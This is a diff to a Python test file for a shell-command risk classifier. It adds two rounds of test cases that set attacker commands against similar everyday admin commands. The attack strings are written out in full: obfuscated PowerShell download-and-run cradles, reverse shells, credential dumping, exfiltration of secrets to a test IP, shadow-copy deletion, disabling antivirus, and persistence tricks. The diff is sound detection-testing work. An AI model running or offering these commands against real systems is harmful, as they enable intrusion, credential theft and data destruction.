@@ -546,3 +546,394 @@ KNOWN_LIMITATIONS: list[Case] = [
     # alone, from the tool being invoked.
     Case("e-json-payload", "curl -X POST https://api.example.com/log -H 'Content-Type: application/json' -d '{\"cmd\":\"powershell -enc\",\"note\":\"mimikatz detected and blocked\"}'", "notable", "telemetry containing indicator words"),
 ]
+
+
+# ── Field set ─────────────────────────────────────────────────────────────────
+# Written after the first production deploy, in two rounds, to look for gaps:
+# living-off-the-land variants, cloud and container credential access, macOS,
+# offensive tooling, and everyday admin commands that share a shape with them.
+# Scored once before any change, then the pipeline was fixed:
+#   round 1: 69/76 attacks at tier; 3 benign commands clearly over-rated
+#   round 2: 61/87 attacks at tier; 10 benign commands clearly over-rated
+# Like every set in this file these are written for the project, not captured
+# from incidents, and the pipeline has since been adjusted against them.
+# Attacks default to a minimum of "suspicious", benign to a maximum of "low";
+# the override tables below record the dual-use commands where "notable"
+# (or, for appending a key to authorized_keys, "suspicious") is the honest answer.
+_FIELD_ATTACK_TIERS = {
+    "enable-rdp": "notable", "sniff-creds": "notable", "masscan": "notable",
+}
+_FIELD_BENIGN_TIERS = {
+    "ps-build": "notable", "b64-hello": "notable", "ssh-tunnel": "notable", "xattr-own": "notable",
+    "iex-profile": "notable", "authorized-keys-own": "suspicious",
+    "invoke-command-svc": "notable", "s3-sync": "notable", "curl-less": "notable",
+    "cron-backup": "notable", "chattr-resolv": "notable", "cmdkey-list": "notable",
+    "curl-upload-api": "notable", "psexec-local": "notable", "cloudflared-http": "notable",
+    "reg-save-app": "notable", "tcpdump-443": "notable", "nc-listen": "notable",
+}
+
+
+def _field(prefix: str, attacks: dict[str, str], benign: dict[str, str]) -> tuple[list[Case], list[Case]]:
+    return (
+        [Case(f"{prefix}-{k}", v, _FIELD_ATTACK_TIERS.get(k, "suspicious"), "field probe") for k, v in attacks.items()],
+        [Case(f"{prefix}-{k}", v, _FIELD_BENIGN_TIERS.get(k, "low"), "field probe") for k, v in benign.items()],
+    )
+
+
+def _field_round1() -> tuple[list[Case], list[Case]]:
+    import base64
+    import zlib  # noqa: F401
+
+    H = "203.0.113.9"
+    U = f"http://{H}"
+
+
+    def b64u16(s: str) -> str:
+        return base64.b64encode(s.encode("utf-16-le")).decode()
+
+
+    def deflate_b64(s: str) -> str:
+        c = zlib.compressobj(9, zlib.DEFLATED, -15)
+        return base64.b64encode(c.compress(s.encode()) + c.flush()).decode()
+
+
+    def xor_b64(s: str, k: int) -> str:
+        return base64.b64encode(bytes(b ^ k for b in s.encode())).decode()
+
+
+    PAY = f"IEX (New-Object Net.WebClient).DownloadString('{U}/a.ps1')"
+
+    attacks = {
+        "delayed-substr": rf'cmd /v /c "set p=xpowershellx&& !p:~1,10! -nop -w hidden -c iex(irm {U}/a)"',
+        "for-f-exec": rf"for /f \"tokens=*\" %i in ('curl -s {U}/c') do %i".replace('\\"', '"'),
+        "env-substr": rf"%COMSPEC:~0,1%ertutil -urlcache -split -f {U}/a.exe %TEMP%\a.exe",
+        "ps-format-op": rf"""powershell -c "& ('{{1}}{{0}}' -f 'ex','i') ((New-Object Net.WebClient).('{{0}}{{1}}' -f 'Download','String').Invoke('{U}/a'))" """,
+        "ps-replace": rf"""powershell -nop -c "iex ('iXXrm {U}/a | iXXex'.Replace('XX',''))" """,
+        "ps-concat": rf"""powershell -c "&('i'+'ex') (&('i'+'rm') '{U}/a')" """,
+        "ps-backtick": rf"""powershell -c "I`E`X (N`ew-Ob`ject Net.Web`Client).Down`loadStr`ing('{U}/a')" """,
+        "ps-env-iex": rf"""powershell -c "& ($env:ComSpec[4,24,25]-join'') (irm {U}/a)" """,
+        "ps-pshome-iex": rf"""powershell ".($pshome[4]+$pshome[30]+'x') (New-Object Net.WebClient).DownloadString('{U}/a')" """,
+        "ps-xor": rf"""powershell -c "$b=[Convert]::FromBase64String('{xor_b64(PAY, 0x35)}');for($i=0;$i -lt $b.Count;$i++){{$b[$i]=$b[$i] -bxor 0x35}};iex([Text.Encoding]::ASCII.GetString($b))" """,
+        "ps-deflate": rf"""powershell -nop -w hidden -c "iex(New-Object IO.StreamReader((New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('{deflate_b64(PAY)}'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()" """,
+        "ps-enc-short": rf"powershell -e {b64u16(PAY)}",
+        "ps-enc-weird-flag": rf"powershell -NoP -NonI -W Hidden -EncodedC {b64u16(PAY)}",
+        "ps-enc-caret-flag": rf"powershell /w 1 /e^c {b64u16(PAY)}",
+        "ps-reverse": rf"""powershell -c "$s=')a/{H}//:ptth mri(xei';iex(-join $s[-1..-($s.Length)])" """,
+        "mshta-vbs": rf'''mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -w hidden -c iwr {U}/a -o $env:temp\a.exe"",0:close")''',
+        "mshta-js-sct": rf'''mshta javascript:a=GetObject("script:{U}/a.sct").Exec();close();''',
+        "squiblydoo": rf"regsvr32 /s /n /u /i:{U}/a.sct scrobj.dll",
+        "wmic-xsl": rf'wmic os get /format:"{U}/a.xsl"',
+        "bitsadmin": rf"bitsadmin /transfer j /download /priority high {U}/a.exe %APPDATA%\a.exe & %APPDATA%\a.exe",
+        "schtasks-enc": rf'schtasks /create /tn "Updater" /tr "powershell -w hidden -enc {b64u16(PAY)}" /sc minute /mo 5 /ru SYSTEM',
+        "run-key": r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Upd /t REG_SZ /d "C:\Users\Public\upd.exe" /f',
+        "rundll-js": rf'''rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:{U}/a")''',
+        "forfiles": rf'forfiles /p c:\windows\system32 /m notepad.exe /c "cmd /c powershell -enc {b64u16(PAY)}"',
+        "msiexec-url": rf"msiexec /q /i {U}/a.msi",
+        "curl-rundll": rf"curl.exe -s -o %TEMP%\a.dll {U}/a.dll & rundll32 %TEMP%\a.dll,Start",
+        "add-admin": r"net user support P@ssw0rd123 /add & net localgroup administrators support /add",
+        "ransom-prep": r"vssadmin delete shadows /all /quiet & wbadmin delete catalog -quiet & bcdedit /set {default} recoveryenabled no",
+        "clear-logs": r"wevtutil cl Security & wevtutil cl System",
+        "comsvcs-ordinal": r"rundll32 C:\windows\system32\comsvcs.dll,#24 624 C:\Windows\Temp\l.dmp full",
+        "ntdsutil": r'ntdsutil "ac i ntds" "ifm" "create full c:\temp\x" q q',
+        "defender-off": r'powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath C:\"',
+        "fw-off": r"netsh advfirewall set allprofiles state off",
+        "esentutl-ntds": r"esentutl.exe /y /vss C:\Windows\ntds\ntds.dit /d c:\temp\n.dit",
+        "finger-clickfix": rf"cmd /c finger run@{H} | cmd",
+        "conhost-headless": rf"conhost.exe --headless powershell -w hidden -c iex(irm {U}/a)",
+        "webdav-rundll": rf"rundll32 \\{H}@80\dav\a.dll,Entry",
+        "clickfix-bareip": rf'powershell -w h -c "iex(irm {H}/x)" # Verify you are human - Cloudflare ID 44812',
+        "hex-ip": r"curl -s http://0xcb007109/a | sh",
+        "dec-ip": r"wget -qO- http://3405803785/a | bash",
+        "curl-cmd": rf"curl -s {U}/a.bat | cmd",
+        "ps-sslbypass": rf"""powershell -c "[Net.ServicePointManager]::ServerCertificateValidationCallback={{$true}};IEX(New-Object Net.WebClient).DownloadString('https://{H}/a')" """,
+        "certutil-decode-run": r"certutil -decode %TEMP%\a.txt %TEMP%\a.exe & start %TEMP%\a.exe",
+        "ps-addtype-valloc": r"""powershell -ep bypass -c "$k=Add-Type -MemberDefinition '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr a,uint b,uint c,uint d);' -Name W -PassThru;$k::VirtualAlloc(0,4096,0x3000,0x40)" """,
+        "recon-burst": r'whoami /all & net group "domain admins" /domain & nltest /domain_trusts & net view /domain',
+        # Linux
+        "bash-devtcp": rf"bash -i >& /dev/tcp/{H}/4444 0>&1",
+        "mkfifo": rf"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {H} 4444 >/tmp/f",
+        "curl-sh-flags": rf"curl -fsSL {U}/x.sh | sudo bash -s -- --quiet",
+        "sh-c-subst": rf'sh -c "$(curl -fsSL {U}/x)"',
+        "bash-procsub": rf"bash <(curl -s {U}/x)",
+        "eval-b64": f"eval \"$(echo {base64.b64encode(f'curl -s {U}/x|sh'.encode()).decode()} | base64 -d)\"",
+        "xxd-sh": "echo " + f"curl -s {U}/x|sh".encode().hex() + " | xxd -r -p | sh",
+        "printf-hex": "printf '" + "".join(f"\\x{b:02x}" for b in f"curl -s {U}/x|sh".encode()) + "' | sh",
+        "rev-sh": "rev <<< '" + f"curl -s {U}/x|sh"[::-1] + "' | sh",
+        "py-exec-b64": "python3 -c \"import base64;exec(base64.b64decode('" + base64.b64encode(f"import os;os.system('curl -s {U}/x|sh')".encode()).decode() + "'))\"",
+        "drop-chmod-run": rf"curl -s {U}/x -o /tmp/.x && chmod +x /tmp/.x && /tmp/.x",
+        "cron-persist": rf'(crontab -l 2>/dev/null; echo "*/5 * * * * curl -s {U}/x | sh") | crontab -',
+        "ssh-key-persist": r"echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7 attacker@kali' >> /root/.ssh/authorized_keys",
+        "suid-bash": r"cp /bin/bash /tmp/.b; chmod u+s /tmp/.b",
+        "hist-clear": r"history -c; unset HISTFILE; rm -f ~/.bash_history",
+        "miner": r"./xmrig -o pool.minexmr.com:4444 -u 44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A -p x --background",
+        "sudoers": r"echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers",
+        "uid0-user": r"useradd -o -u 0 -g 0 -M -d /root -s /bin/bash sysadm",
+        "shadow-exfil": rf"cat /etc/shadow | nc {H} 9001",
+        "tar-exfil": rf"tar czf - /home /etc 2>/dev/null | curl -s -T - {U}/up",
+        "openssl-shell": rf"mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {H}:443 > /tmp/s; rm /tmp/s",
+        "socat-shell": rf"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{H}:4444",
+        "awk-shell": rf"""awk 'BEGIN {{s = "/inet/tcp/0/{H}/4444"; while(42) {{ do{{ printf "shell>" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != "exit") close(s); }}}}' /dev/null""",
+        "docker-escape": r"docker run -v /:/host --privileged -it alpine chroot /host /bin/sh",
+        "ld-preload": r"echo /tmp/.lib.so >> /etc/ld.so.preload",
+        "wipe": r"dd if=/dev/zero of=/dev/sda bs=1M",
+        "iptables-flush-kill": r"iptables -F; systemctl stop firewalld; setenforce 0; pkill -9 -f falcon-sensor",
+        "systemd-persist": rf"printf '[Service]\nExecStart=/bin/sh -c \"curl -s {U}/x|sh\"\n[Install]\nWantedBy=multi-user.target\n' > /etc/systemd/system/upd.service; systemctl enable --now upd",
+        "mac-quarantine": rf"curl -s {U}/a.dmg -o /tmp/a.dmg && xattr -d com.apple.quarantine /tmp/a.dmg && hdiutil attach /tmp/a.dmg",
+        "mac-keychain": r"security find-generic-password -wa 'Chrome'",
+        "mac-launchagent": r"launchctl load -w ~/Library/LaunchAgents/com.apple.updater.plist && chmod +x /Users/Shared/.upd && /Users/Shared/.upd",
+    }
+    benign = {
+        "temp-clean": r'powershell -Command "Get-ChildItem $env:TEMP | Remove-Item -Recurse -Force"',
+        "certutil-hash": r"certutil -hashfile C:\Users\bob\Downloads\ubuntu.iso SHA256",
+        "docker-script-dl": r"curl -fsSL https://get.docker.com -o get-docker.sh",
+        "gh-api-jq": r"curl -s https://api.github.com/repos/cli/cli/releases/latest | jq -r .tag_name",
+        "wget-tar": r"wget https://example.com/file.tar.gz && tar xzf file.tar.gz",
+        "docker-test": r"docker run --rm -it -v $(pwd):/app -w /app node:20 npm test",
+        "schtasks-query": r"schtasks /query /fo LIST /v",
+        "reg-query-run": r"reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run",
+        "ps-build": r"powershell -ExecutionPolicy Bypass -File .\build.ps1 -Configuration Release",
+        "b64-hello": r'echo "SGVsbG8gd29ybGQ=" | base64 -d',
+        "ssh-tunnel": r"ssh -L 8080:localhost:80 deploy@bastion.example.com",
+        "nc-portcheck": r"nc -zv db.example.com 5432",
+        "openssl-check": r"openssl s_client -connect example.com:443 -servername example.com </dev/null",
+        "rundll-cpl": r"rundll32.exe shell32.dll,Control_RunDLL desk.cpl",
+        "rundll-printer": r"rundll32 printui.dll,PrintUIEntry /in /n \\printsrv\HP-Floor2",
+        "msiexec-local": r"msiexec /i C:\installers\7z2301-x64.msi /qn /norestart",
+        "wmic-bios": r"wmic bios get serialnumber",
+        "wevtutil-query": r"wevtutil qe Security /c:5 /rd:true /f:text",
+        "vss-list": r"vssadmin list shadows",
+        "bcdedit-enum": r"bcdedit /enum",
+        "fw-show": r"netsh advfirewall show allprofiles",
+        "mp-get": r"powershell Get-MpPreference",
+        "mp-enable": r"powershell Set-MpPreference -DisableRealtimeMonitoring $false",
+        "deploy-sh": r"chmod +x deploy.sh && ./deploy.sh production",
+        "crontab-l": r"crontab -l",
+        "nginx-restart": r"sudo systemctl restart nginx",
+        "find-delete-logs": r'find /var/log/app -name "*.log" -mtime +7 -delete',
+        "tar-backup": r"tar czf /backups/etc-$(date +%F).tgz /etc",
+        "rsync": r"rsync -avz --delete /data/ backup@nas.example.com:/backups/data/",
+        "cat-passwd": r"cat /etc/passwd",
+        "py-b64-print": r"""python3 -c "import base64;print(base64.b64encode(b'hi').decode())" """,
+        "iptables-list": r"iptables -L -n -v",
+        "kubectl-get": r"kubectl get pods -A -o wide",
+        "docker-exec": r"docker exec -it web bash",
+        "mktemp-jq": r"tmp=$(mktemp); curl -s https://example.com/data.json > $tmp; jq . $tmp; rm $tmp",
+        "chrome-headless": r'"C:\Program Files\Google\Chrome\Application\chrome.exe" --headless --dump-dom https://example.com',
+        "ps-b64-png": r"""powershell -c "[Convert]::ToBase64String([IO.File]::ReadAllBytes('logo.png'))" """,
+        "iwr-health": r"Invoke-WebRequest https://example.com/health -UseBasicParsing | Select-Object StatusCode",
+        "net-use": r"net use Z: \\fileserver\share /persistent:yes",
+        "taskkill": r"taskkill /f /im chrome.exe",
+        "sc-stop": r"sc stop spooler && sc start spooler",
+        "for-hostname": r"for /f %i in ('hostname') do echo %i",
+        "delayed-echo": r'cmd /v /c "set a=hello&& echo !a!"',
+        "ps-format-benign": r"""powershell -c "'{0} has {1} items' -f $env:COMPUTERNAME,(Get-ChildItem).Count" """,
+        "ps-replace-benign": r"""powershell -c "(Get-Content app.config).Replace('localhost','db01') | Set-Content app.config" """,
+        "py-http": r"python3 -m http.server 8000",
+        "scp": r"scp build.tar.gz deploy@web01.example.com:/tmp/",
+        "useradd": r"sudo useradd -m -s /bin/bash -G docker alice",
+        "authorized-keys-own": r"cat ~/.ssh/id_ed25519.pub >> ~/.ssh/authorized_keys",
+        "dd-usb-iso": r"sudo dd if=ubuntu-24.04.iso of=/dev/sdb bs=4M status=progress",
+        "xattr-own": r"xattr -d com.apple.quarantine ~/Applications/MyTool.app",
+        "launchctl-list": r"launchctl list | grep com.apple",
+        "history-grep": r"history | grep ssh",
+        "sudoers-visudo": r"sudo visudo -c",
+        "choco": r"choco install git -y",
+        "winget": r"winget install --id Microsoft.PowerToys -e",
+        "ps-module": r"Install-Module -Name Az -Scope CurrentUser -Force",
+        "iex-profile": r"Invoke-Expression (Get-Content .\env.ps1 -Raw)",
+        "wsl-update": r"wsl --update && wsl --shutdown",
+        "pip-url": r"pip install https://github.com/psf/requests/archive/refs/heads/main.zip",
+        "ansible": r"ansible all -m shell -a 'uptime' -i inventory.ini",
+        "xxd-view": r"xxd -l 64 firmware.bin",
+        "rev-word": r"echo hello | rev",
+        "printf-fmt": r"printf '%s\n' \"$PATH\" | tr ':' '\n'",
+    }
+    return _field("f1", attacks, benign)
+
+
+def _field_round2() -> tuple[list[Case], list[Case]]:
+    import base64
+    import zlib  # noqa: F401
+
+    H = "203.0.113.9"
+    U = f"http://{H}"
+
+
+    def b64(s: str) -> str:
+        return base64.b64encode(s.encode()).decode()
+
+
+    def b64u16(s: str) -> str:
+        return base64.b64encode(s.encode("utf-16-le")).decode()
+
+
+    SH = f"curl -s {U}/x|sh"
+    ENC = b64u16(f"IEX (New-Object Net.WebClient).DownloadString('{U}/a.ps1')")
+
+    attacks = {
+        "b64-drop-decode-run": rf"cmd /c echo {b64('MZ fake payload bytes here')} > %temp%\a.b64 & certutil -decode %temp%\a.b64 %temp%\a.exe & %temp%\a.exe",
+        "bits-ps": rf'powershell -c "Start-BitsTransfer -Source {U}/a.exe -Destination $env:TEMP\a.exe; Start-Process $env:TEMP\a.exe"',
+        "renamed-lolbin": rf"cmd /c copy /b %windir%\system32\certutil.exe %temp%\c.exe & %temp%\c.exe -urlcache -split -f {U}/a.exe %temp%\a.exe",
+        "invoke-command-remote": rf"powershell -c \"Invoke-Command -ComputerName DC01 -ScriptBlock {{ iex (irm {U}/a) }}\"".replace('\\"', '"'),
+        "wmic-node": rf'wmic /node:10.0.0.5 /user:corp\admin process call create "powershell -enc {ENC}"',
+        "psexec-remote": rf'psexec \\10.0.0.5 -accepteula -s -d cmd /c "powershell -enc {ENC}"',
+        "sc-remote-create": rf'sc \\fs01 create upd binPath= "cmd /c powershell -enc {ENC}" start= auto',
+        "reg-save-hives": r"reg save HKLM\SAM C:\Windows\Temp\s & reg save HKLM\SYSTEM C:\Windows\Temp\y",
+        "procdump-lsass": r"procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\l.dmp",
+        "vaultcmd": r'cmdkey /list & vaultcmd /listcreds:"Windows Credentials" /all',
+        "collect-exfil": rf'powershell -c "Get-ChildItem -Recurse C:\Users -Include *.kdbx,*.pfx,id_rsa | Compress-Archive -DestinationPath $env:TEMP\x.zip; curl.exe -F f=@$env:TEMP\x.zip {U}/u"',
+        "rclone-exfil": r"rclone.exe copy \\fs01\finance mega:backup --config C:\ProgramData\r.conf --transfers 32",
+        "7z-password-share": r"7z a -pS3cret -mhe C:\ProgramData\d.7z \\fs01\finance\*",
+        "usn-delete": r"fsutil usn deletejournal /d c:",
+        "icacls-everyone": r"icacls C:\ /grant Everyone:F /T /C /Q",
+        "shadow-wmi-delete": r'powershell -c "Get-WmiObject Win32_ShadowCopy | % {$_.Delete()}"',
+        "safeboot-reboot": r"bcdedit /set {default} safeboot minimal & shutdown /r /t 0",
+        "stop-av-services": r'net stop "Sophos AutoUpdate Service" /y & sc config WinDefend start= disabled',
+        "kill-defender": r"taskkill /f /im MsMpEng.exe",
+        "defender-policy": r'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f',
+        "enable-rdp": r'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f & netsh advfirewall firewall set rule group="remote desktop" new enable=yes',
+        "wdigest": r"reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f",
+        "ifeo-sethc": r'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe" /f',
+        "utilman-swap": r"copy /y C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe",
+        "fodhelper": r'reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd /c C:\Users\Public\a.exe" /f & reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /f & fodhelper.exe',
+        "startup-lnk": r"""powershell -c "$s=New-Object -ComObject WScript.Shell;$l=$s.CreateShortcut($env:APPDATA+'\Microsoft\Windows\Start Menu\Programs\Startup\u.lnk');$l.TargetPath='C:\Users\Public\u.exe';$l.Save()" """,
+        "odbcconf": r"odbcconf /a {REGSVR C:\Users\Public\a.dll}",
+        "cmstp": r"cmstp.exe /ni /s C:\Users\Public\a.inf",
+        "msbuild-public": r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\Users\Public\a.xml",
+        "mavinject": r"mavinject.exe 1234 /INJECTRUNNING C:\Users\Public\a.dll",
+        "curl-pipe-ps": rf"curl -s {U}/a.ps1 | powershell -nop -",
+        "type-pipe-ps": r"type C:\Users\Public\a.txt | powershell -nop -w hidden -",
+        "ssh-rsocks": rf"ssh -o StrictHostKeyChecking=no -R 9050 tunnel@{H} -N -f",
+        "ngrok-rdp": r"ngrok.exe tcp 3389 --authtoken 2abcDEF",
+        "cloudflared-rdp": r"cloudflared.exe tunnel --url rdp://localhost:3389",
+        "chisel": rf"chisel.exe client {H}:8080 R:socks",
+        "anydesk-silent": r"C:\ProgramData\AnyDesk.exe --install C:\ProgramData\AnyDesk --start-with-win --silent & echo P@ssw0rd | C:\ProgramData\AnyDesk\AnyDesk.exe --set-password",
+        "adfind": r'adfind.exe -f "(objectcategory=person)" > C:\ProgramData\ad_users.txt',
+        "sharphound": r"SharpHound.exe -c All --zipfilename loot.zip",
+        "setspn-all": r"setspn -T corp.example -Q */*",
+        "wmi-shadow-wmic": r"wmic shadowcopy delete /nointeractive",
+        # Linux
+        "revshell-loop": rf"nohup bash -c 'while true; do bash -i >& /dev/tcp/{H}/443 0>&1; sleep 60; done' &",
+        "php-shell": rf"""php -r '$s=fsockopen("{H}",4444);exec("/bin/sh -i <&3 >&3 2>&3");'""",
+        "ncat-e": rf"ncat {H} 4444 -e /bin/bash",
+        "nc-listen-e": r"nc -lvnp 4444 -e /bin/sh",
+        "busybox-nc": rf"busybox nc {H} 4444 -e sh",
+        "telnet-shell": rf"telnet {H} 4444 | /bin/sh | telnet {H} 4445",
+        "curl-python": rf"curl -s {U}/x.py | python3 -",
+        "mirai-style": rf"cd /tmp || cd /var/run || cd /mnt; wget {U}/mips; chmod 777 mips; ./mips; rm -f mips",
+        "tftp-drop": rf"tftp -g -r x {H}; chmod 777 x; ./x",
+        "at-shell": rf"echo 'bash -i >& /dev/tcp/{H}/443 0>&1' | at now + 1 minute",
+        "histfile-null": r"export HISTFILE=/dev/null; ln -sf /dev/null ~/.bash_history",
+        "log-wipe": r"shred -u /var/log/auth.log; echo > /var/log/wtmp; journalctl --vacuum-time=1s",
+        "passwd-root2": r"echo 'root2:$1$x$Yq0bnJQ6cO2oK1c9p3nQf1:0:0::/root:/bin/bash' >> /etc/passwd",
+        "sshd-rootlogin": r"sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config && systemctl restart sshd",
+        "gtfo-find": r"sudo find . -exec /bin/sh \; -quit",
+        "gtfo-vim": r"sudo vim -c ':!/bin/sh'",
+        "gtfo-awk": r"""sudo awk 'BEGIN {system("/bin/sh")}'""",
+        "py-setuid": r"""python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'""",
+        "sniff-creds": r"tcpdump -i eth0 -w /tmp/.c.pcap port 21 or port 23 or port 110",
+        "hunt-keys": r"find / -name id_rsa 2>/dev/null; cat ~/.aws/credentials; grep -rI 'password' /var/www 2>/dev/null",
+        "env-exfil": rf"env | grep -i -E 'key|secret|token' | curl -s -d @- {U}/c",
+        "imds-creds": r"curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+        "k8s-secrets": r"kubectl get secrets -A -o yaml > /tmp/.s; cat /var/run/secrets/kubernetes.io/serviceaccount/token",
+        "aws-backdoor-key": r"aws iam create-access-key --user-name admin; aws iam attach-user-policy --user-name admin --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
+        "masscan": r"masscan 10.0.0.0/8 -p445,3389 --rate 10000 -oL /tmp/.m",
+        "hydra": r"hydra -l root -P rockyou.txt ssh://10.0.0.5 -t 4",
+        "sqlmap-os-shell": r'sqlmap -u "http://10.0.0.8/item?id=1" --batch --os-shell',
+        "msfvenom": rf"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={H} LPORT=443 -f elf -o /tmp/m",
+        "b64-herestring-bash": f"base64 -d <<< {b64(SH)} | bash",
+        "bash-c-b64-subst": f'bash -c "$(base64 -d <<< {b64(SH)})"',
+        "b64-decode-long": f"echo {b64(SH)} | base64 --decode | bash",
+        "openssl-b64": f"echo {b64(SH)} | openssl enc -d -base64 | sh",
+        "py-print-b64-sh": f"""python3 -c 'print(__import__("base64").b64decode("{b64(SH)}").decode())' | sh""",
+        "cmd-subst-names": f"$(echo {b64('curl')} | base64 -d) -s {U}/x | $(echo {b64('sh')} | base64 -d)",
+        "octal-ansi": rf"x=$'\143\165\162\154'; $x -s {U}/x | sh",
+        "cron-hourly": rf"echo 'curl -s {U}/x | sh' > /etc/cron.hourly/upd; chmod +x /etc/cron.hourly/upd",
+        "ifs-comma": rf"IFS=,;c=curl,-s,{U}/x;$c|sh",
+        "herestring-sh": rf'sh <<< "$(curl -s {U}/x)"',
+        "tee-sh": rf"curl -s {U}/x | tee /tmp/.x | sh",
+        "dot-procsub": rf". <(curl -s {U}/x)",
+        "devtcp-http": rf"""exec 3<>/dev/tcp/{H}/80; echo -e "GET /x HTTP/1.0\r\n\r\n" >&3; cat <&3 | sh""",
+        "mac-b64-D": f"echo {b64(SH)} | base64 -D | sh",
+        "mac-loginhook": r"defaults write com.apple.loginwindow LoginHook /Users/Shared/.h.sh",
+        "mac-chrome-logins": r"""sqlite3 ~/Library/Application\ Support/Google/Chrome/Default/Login\ Data "select origin_url,username_value,password_value from logins" """,
+        "mac-gatekeeper-off": r"sudo spctl --master-disable",
+        "mac-osascript-sh": rf"""osascript -e 'do shell script "curl -s {U}/x | sh"'""",
+    }
+    benign = {
+        "bits-msu": r'powershell -c "Start-BitsTransfer -Source https://download.microsoft.com/kb5031356.msu -Destination C:\patches\"',
+        "invoke-command-svc": r"Invoke-Command -ComputerName web01 -ScriptBlock { Get-Service W3SVC }",
+        "wmic-node-os": r"wmic /node:web01 os get caption",
+        "sc-remote-query": r"sc \\web01 query w3svc",
+        "reg-add-app": r"reg add HKCU\Software\MyApp /v Theme /d dark /f",
+        "7z-backup": r"7z a backup.7z C:\Projects\site",
+        "icacls-iis": r'icacls C:\inetpub\wwwroot /grant "IIS_IUSRS:(OI)(CI)RX"',
+        "spooler-restart": r"net stop spooler & net start spooler",
+        "attrib": r"attrib -h -s desktop.ini",
+        "imds-instance-id": r"curl -s http://169.254.169.254/latest/meta-data/instance-id",
+        "s3-sync": r"aws s3 sync ./build s3://my-site --delete",
+        "tcpdump-443": r"sudo tcpdump -i eth0 port 443 -c 100",
+        "grep-todo": r'grep -rn "TODO" src/',
+        "find-conf": r'find /etc -name "*.conf" 2>/dev/null | head',
+        "sed-env": r"sed -i 's/DEBUG=true/DEBUG=false/' .env",
+        "journal-since": r'journalctl -u nginx --since "1 hour ago"',
+        "journal-vacuum": r"sudo journalctl --vacuum-time=30d",
+        "apt": r"sudo apt-get update && sudo apt-get install -y curl",
+        "curl-less": r"curl -sSL https://example.com/install.sh -o install.sh && less install.sh",
+        "wget-jq": r"wget -qO- https://example.com/status.json | jq .",
+        "cron-backup": r'echo "0 2 * * * /usr/local/bin/backup.sh" | crontab -',
+        "histsize": r"export HISTSIZE=10000",
+        "chattr-resolv": r"sudo chattr +i /etc/resolv.conf",
+        "gcc-run": r"gcc -O2 -o app main.c && ./app",
+        "ssh-keygen": r'ssh-keygen -t ed25519 -C "me@example.com"',
+        "ssh-copy-id": r"ssh-copy-id deploy@web01.example.com",
+        "mount-usb": r"sudo mount /dev/sdb1 /mnt/usb",
+        "php-version": r"php -r 'echo PHP_VERSION;'",
+        "perl-print": r"""perl -e 'print "hi\n"'""",
+        "node-e": r'node -e "console.log(require(\"os\").hostname())"',
+        "py-hostname": r'python -c "import socket;print(socket.gethostname())"',
+        "telnet-smtp": r"telnet mail.example.com 25",
+        "defaults-finder": r"defaults write com.apple.finder AppleShowAllFiles -bool true",
+        "sqlite-count": r'sqlite3 app.db "select count(*) from users"',
+        "spctl-status": r"spctl --status",
+        "openssl-b64-file": r"openssl enc -d -base64 -in cert.b64 -out cert.der",
+        "shadow-list-ps": r'powershell -c "Get-WmiObject Win32_ShadowCopy | Select-Object InstallDate"',
+        "setspn-list": r"setspn -L svc_sql",
+        "cmdkey-list": r"cmdkey /list",
+        "taskkill-notepad": r"taskkill /f /im notepad.exe",
+        "reg-save-app": r"reg save HKCU\Software\MyApp backup.hiv",
+        "zip-logs": r"Get-ChildItem -Recurse -Include *.log | Compress-Archive -DestinationPath logs.zip",
+        "curl-upload-api": r"curl -F file=@report.pdf https://api.example.com/upload",
+        "msbuild-sln": r"msbuild MySolution.sln /p:Configuration=Release",
+        "installutil-svc": r"InstallUtil.exe MyService.exe",
+        "tar-extract": r"tar -xf archive.tar -C C:\tools",
+        "shutdown": r"shutdown /r /t 0",
+        "find-exec-rm": r"sudo find . -name '*.tmp' -exec rm {} \;",
+        "vim-wq": r"vim -c ':wq' notes.txt",
+        "awk-print": r"""awk 'BEGIN {print "hi"}'""",
+        "at-backup": r"at now + 1 hour -f backup.sh",
+        "shred-file": r"shred -u old-secrets.txt",
+        "nc-listen": r"nc -l 8080",
+        "copy-cmd": r"copy /y C:\build\out\app.exe C:\deploy\app.exe",
+        "sshd-restart": r"sudo systemctl restart sshd",
+        "passwd-change": r"sudo passwd alice",
